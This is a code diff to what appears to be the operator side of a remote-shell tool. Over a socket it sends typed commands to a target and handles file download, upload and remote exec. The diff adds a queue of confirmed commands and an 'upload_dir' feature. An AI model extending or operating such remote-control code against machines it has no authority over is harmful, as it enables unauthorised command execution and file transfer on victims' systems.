@@ -6,8 +6,16 @@ import command as cmd
 
 
 def target_communication(s: socket.socket, ip: str, verbose=False):
+    command_buffers: list[str] = []
+
     while True:
-        command = input(f"* Shell~{ip}: ")
+        if command_buffers:
+            command = command_buffers.pop(0)
+            if input(f"[buffer] execute -> {command}? (Y/N):") != "Y":
+                continue
+        else:
+            command = input(f"* Shell~{ip}: ")
+
         comm.send(s, command, verbose)
 
         func, args = cmd.extract_command(command)
@@ -25,6 +33,9 @@ def target_communication(s: socket.socket, ip: str, verbose=False):
             cmd.download_file(s, args)
         elif func == "upload":
             cmd.upload_file(s, args)
+        # upload_dir [source_dir] [target_dir]
+        elif func == "upload_dir":
+            cmd.upload_dir(args, command_buffers)
         # exec [func] [...args]
         elif func == "exec":
             cmd.recv_exec_command(s)
